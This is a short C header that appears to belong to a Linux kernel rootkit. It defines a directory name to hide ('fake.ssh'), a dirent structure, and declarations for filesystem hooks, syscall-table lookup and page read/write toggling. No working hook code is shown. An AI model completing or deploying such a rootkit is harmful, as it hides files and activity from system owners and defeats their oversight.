#ifndef FILESYSTEM_H
#define FILESYSTEM_H

#define FALSE 0
#define TRUE  1

#define HIDE_DIR "fake.ssh"

struct linux_dirent{
  unsigned long d_ino;
  unsigned long d_off;
  unsigned short d_reclen;
  char d_name[1];
};

void init_filesystem_hook(void);
void exit_filesystem_hook(void);
unsigned long **getTableAddress(void);
int make_ro(unsigned long address);
int make_rw(unsigned long address);

#endif
